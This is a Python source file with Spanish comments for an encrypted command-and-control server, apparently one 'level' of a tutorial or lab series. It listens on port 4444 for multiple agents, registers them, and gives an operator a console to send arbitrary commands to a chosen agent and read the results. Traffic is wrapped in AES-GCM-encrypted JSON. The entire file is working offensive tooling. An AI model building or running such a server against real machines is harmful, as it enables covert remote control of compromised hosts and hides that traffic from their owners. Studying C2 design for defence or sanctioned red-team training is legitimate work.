"""
Servidor C2 - Nivel 2 (con cifrado)
Acepta conexiones de múltiples agentes, permite al operador
elegir un agente y mandarle comandos, recibe y muestra resultados.

Protocolo: JSON cifrado con AES-GCM, un mensaje por línea (base64 + \n).
"""

import socket
import threading
import uuid

from crypto_layer import encrypt_json, decrypt_line

HOST = "0.0.0.0"
PORT = 4444

# Diccionario de agentes conectados: {agent_id: socket}
agents = {}
agents_lock = threading.Lock()


def send_json(sock, data: dict):
    """Cifra un dict y lo envía por el socket (delimitado por newline)."""
    sock.sendall(encrypt_json(data))


def recv_json(sock, buffer: bytes):
    """
    Lee del socket hasta tener al menos un mensaje completo (newline),
    descifra ese mensaje y lo devuelve como dict.
    buffer es bytes (no str) porque ahora viaja en base64 + binario cifrado.
    Devuelve (mensaje_dict_o_None, buffer_restante).
    """
    while b"\n" not in buffer:
        chunk = sock.recv(4096)
        if not chunk:
            return None, buffer  # conexión cerrada
        buffer += chunk
    line, buffer = buffer.split(b"\n", 1)
    if not line.strip():
        return {}, buffer
    return decrypt_line(line.decode()), buffer


def handle_agent(conn, addr):
    """Hilo dedicado a cada agente conectado."""
    buffer = b""
    agent_id = None
    try:
        # Esperamos el mensaje de registro inicial ("hello")
        msg, buffer = recv_json(conn, buffer)
        if msg and msg.get("type") == "hello":
            agent_id = msg.get("agent_id", str(uuid.uuid4())[:8])
            with agents_lock:
                agents[agent_id] = conn
            print(f"[+] Agente conectado: {agent_id} desde {addr} ({msg.get('hostname')})")

        # Loop principal: escuchar resultados que manda el agente
        while True:
            msg, buffer = recv_json(conn, buffer)
            if msg is None:
                break  # agente se desconectó
            if msg.get("type") == "result":
                print(f"\n[resultado de {agent_id}] (id={msg.get('id')}):")
                print(msg.get("output"))
                print(f"> ", end="", flush=True)  # repinta el prompt del operador

    except (ConnectionResetError, ValueError) as e:
        print(f"[!] Error con agente {agent_id}: {e}")
    finally:
        if agent_id:
            with agents_lock:
                agents.pop(agent_id, None)
            print(f"\n[-] Agente desconectado: {agent_id}")


def operator_console():
    """Consola simple para que el operador mande comandos."""
    print("Consola de operador. Comandos:")
    print("  list                  -> lista agentes conectados")
    print("  use <agent_id> <cmd>  -> manda un comando a un agente")
    print("  exit                  -> salir\n")

    while True:
        try:
            line = input("> ").strip()
        except EOFError:
            break

        if line == "list":
            with agents_lock:
                if not agents:
                    print("(sin agentes conectados)")
                for aid in agents:
                    print(f" - {aid}")

        elif line.startswith("use "):
            parts = line.split(" ", 2)
            if len(parts) < 3:
                print("Uso: use <agent_id> <comando>")
                continue
            _, agent_id, command = parts
            with agents_lock:
                conn = agents.get(agent_id)
            if not conn:
                print(f"Agente '{agent_id}' no encontrado")
                continue
            msg_id = str(uuid.uuid4())[:8]
            send_json(conn, {"type": "cmd", "id": msg_id, "command": command})
            print(f"[enviado] id={msg_id} -> {agent_id}: {command}")

        elif line == "exit":
            break


def main():
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind((HOST, PORT))
    server_sock.listen(5)
    print(f"[*] Servidor C2 escuchando en {HOST}:{PORT} (canal cifrado AES-GCM)")

    def accept_loop():
        while True:
            conn, addr = server_sock.accept()
            t = threading.Thread(target=handle_agent, args=(conn, addr), daemon=True)
            t.start()

    threading.Thread(target=accept_loop, daemon=True).start()
    operator_console()


if __name__ == "__main__":
    main()
